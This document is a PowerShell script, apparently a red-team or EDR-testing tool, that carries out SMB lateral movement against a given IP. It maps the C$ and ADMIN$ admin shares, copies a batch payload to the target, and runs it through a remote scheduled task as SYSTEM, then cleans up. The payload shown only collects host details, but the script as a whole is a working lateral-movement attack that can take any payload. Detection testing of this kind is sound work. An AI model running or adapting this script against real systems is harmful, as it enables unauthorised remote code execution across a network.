param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Lateral Movement - SMB Admin Share Access..." -ForegroundColor Cyan

# T1021.002 - Remote Services: SMB/Windows Admin Shares
# T1570 - Lateral Tool Transfer
# Accesses admin shares (C$, ADMIN$) and copies payloads for remote execution

Write-Host "[*] [T1021.002] SMB Admin Share lateral movement" -ForegroundColor Yellow
Write-Host "[!] Target: $TargetIP" -ForegroundColor Yellow
Write-Host "[!] Requires: Domain Admin or local admin on target" -ForegroundColor Yellow

# Step 1: Test SMB connectivity
Write-Host "`n[*] Testing SMB connectivity to $TargetIP..."
$smbTest = Test-NetConnection -ComputerName $TargetIP -Port 445 -WarningAction SilentlyContinue
if ($smbTest.TcpTestSucceeded) {
    Write-Host "[+] SMB port 445 is open" -ForegroundColor Green
} else {
    Write-Host "[-] SMB port 445 not reachable" -ForegroundColor Red
}

# Step 2: Enumerate accessible shares
Write-Host "`n[*] [T1135] Enumerating network shares on $TargetIP..."
Write-Host "    CMD: net view \\$TargetIP"
net view "\\$TargetIP" 2>&1

# Step 3: Access admin shares
Write-Host "`n[*] [T1021.002] Attempting to access admin shares..."

Write-Host "    CMD: net use \\$TargetIP\C$"
net use "\\$TargetIP\C$" 2>&1

Write-Host "    CMD: dir \\$TargetIP\C$\Users"
cmd /c "dir \\$TargetIP\C$\Users" 2>&1

Write-Host "`n    CMD: net use \\$TargetIP\ADMIN$"
net use "\\$TargetIP\ADMIN$" 2>&1

# Step 4: Copy payload to target (lateral tool transfer)
Write-Host "`n[*] [T1570] Copying payload to target..."
$payloadContent = @"
@echo off
echo [RTL] Lateral movement payload executed successfully
hostname
whoami
ipconfig /all
echo [RTL] Execution complete
"@
$localPayload = "C:\temp\staging\payload.bat"
$payloadContent | Out-File $localPayload -Encoding ASCII

Write-Host "    CMD: copy C:\temp\staging\payload.bat \\$TargetIP\C$\temp\payload.bat"
copy $localPayload "\\$TargetIP\C$\temp\payload.bat" 2>&1

# Step 5: Schedule remote execution
Write-Host "`n[*] [T1053.005] Scheduling remote execution via schtasks..."
Write-Host "    CMD: schtasks /create /s $TargetIP /tn RTL_Lateral /tr C:\temp\payload.bat /sc once /st 00:00 /ru SYSTEM"
schtasks /create /s $TargetIP /tn "RTL_Lateral" /tr "C:\temp\payload.bat" /sc once /st 00:00 /ru SYSTEM /f 2>&1

Write-Host "    CMD: schtasks /run /s $TargetIP /tn RTL_Lateral"
schtasks /run /s $TargetIP /tn "RTL_Lateral" 2>&1

# Cleanup scheduled task
Start-Sleep -Seconds 3
Write-Host "`n[*] Cleaning up remote scheduled task..."
schtasks /delete /s $TargetIP /tn "RTL_Lateral" /f 2>&1

# Disconnect shares
Write-Host "`n[*] Disconnecting mapped shares..."
net use "\\$TargetIP\C$" /delete /y 2>&1
net use "\\$TargetIP\ADMIN$" /delete /y 2>&1

Write-Host "`n[+] SMB Lateral Movement Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Admin share access (C$, ADMIN$), remote file copy, schtasks creation" -ForegroundColor Yellow
